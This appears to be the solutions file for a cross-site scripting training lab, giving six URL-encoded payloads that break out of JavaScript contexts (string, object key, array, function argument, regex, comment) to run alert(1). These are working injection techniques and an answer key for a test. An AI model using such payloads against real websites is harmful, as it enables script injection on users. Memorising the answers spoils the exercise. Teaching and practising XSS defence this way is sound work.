# jsctx — solutions

Reflection inside `<script>` blocks across various JS contexts (string, object key, array, function arg, regex, comment).

### jsctx-level1

`/jsctx/level1/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: `var x = "...";` — break out of double-quoted string

### jsctx-level2

`/jsctx/level2/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: object-key position; close the script block

### jsctx-level3

`/jsctx/level3/?query=%22,alert(1),%22`

- payload: `",alert(1),"`
- context: `var arr = ["a", "...", "b"];` — break out, eval, rejoin

### jsctx-level4

`/jsctx/level4/?query=%22);alert(1);//`

- payload: `");alert(1);//`
- context: `process("...");` — close arg+call, then inject

### jsctx-level5

`/jsctx/level5/?query=x/;alert(1);//`

- payload: `x/;alert(1);//`
- context: `var pattern = /.../g;` — close a non-empty regex literal, run code

### jsctx-level6

`/jsctx/level6/?query=*/alert(1)//`

- payload: `*/alert(1)//`
- context: inside `/* ... */` — close the comment, run, comment out the rest
